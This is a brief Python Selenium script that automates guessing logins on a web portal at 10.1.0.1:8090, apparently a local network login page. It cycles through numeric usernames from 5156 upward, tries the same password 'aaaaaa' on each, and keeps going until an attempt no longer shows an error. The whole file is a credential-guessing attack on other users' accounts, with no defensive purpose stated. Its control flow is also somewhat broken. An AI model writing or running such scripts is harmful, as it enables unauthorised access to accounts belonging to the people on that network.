from selenium import webdriver
import time
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By

options = Options()
options.binary_location = r'C:\Program Files\Mozilla Firefox\firefox.exe'

num = 5156

link = ("http://10.1.0.1:8090")

web = webdriver.Firefox(options=options)
web.get(link)
time.sleep(1)

def login():
    global num
    try:
        id = web.find_element("xpath", '//*[@id="username"]')
        id.clear()
        id.send_keys(num)

        passi = web.find_element("xpath",'//*[@id="password"]')
        passi.clear()
        passi.send_keys("aaaaaa")

        time.sleep(.5)
        but = web.find_element("xpath", '//*[@id="loginbutton"]')
        but.click()

        te = web.find_element(By.CLASS_NAME, 'red')
        if te:
            num = num + 1
            time.sleep(.5)
            login()
        else:
            web.close()
    except Exception as e:
        print(e)
        web.close()
#huggihi;


login()
